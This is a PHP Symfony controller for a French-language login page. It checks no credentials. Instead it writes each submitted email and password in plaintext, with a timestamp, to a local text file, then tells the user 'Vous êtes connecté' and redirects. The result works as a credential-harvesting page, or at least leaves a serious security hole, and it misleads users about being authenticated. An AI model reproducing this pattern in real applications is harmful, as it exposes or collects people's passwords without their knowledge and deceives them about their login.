<?php

namespace App\Controller;

use App\Form\FormConnexionType;
use Symfony\Component\HttpKernel\KernelInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class FormConnexionController extends AbstractController
{
    #[Route('/connexion', name: 'app_form_connexion', methods: ['GET', 'POST'])]
    public function new(Request $request): Response
    {
        // Création du formulaire de connexion
        $form = $this->createForm(FormConnexionType::class);

        // Gestion de la soumission du formulaire
        $form->handleRequest($request);
        if ($form->isSubmitted() && $form->isValid()) {
            // Récupération des données soumises
            $data = $form->getData();

            // Enregistrement des données dans un fichier
            $this->saveFormDataToFile($data);

            // Répondre à l'utilisateur avec un message de succès et redirection vers la page d'accueil
            $this->addFlash('success', 'Vous êtes connecté.');
            return $this->redirectToRoute('app_home');
        }

        // Rendu de la vue avec le formulaire
        return $this->render('form_connexion/connexion.html.twig', [
            'form' => $form->createView(),
        ]);
    }

    // Fonction pour enregistrer les données dans un fichier
    private function saveFormDataToFile($data)
    {
        // Définition du chemin du fichier
        $filePath = realpath($this->getParameter('kernel.project_dir')) . "/var/data/connexion.txt";
    
        // Récupération de l'email et du mot de passe à partir de l'objet FormConnexion
        $email = $data->getEmail();
        $password = $data->getPassword();
    
        // Enregistrement des données dans le fichier
        $logData = date('Y-m-d H:i:s') . ': ' . "mail: $email - Mdp: $password" . PHP_EOL;
        file_put_contents($filePath, $logData, FILE_APPEND);
    }
    

}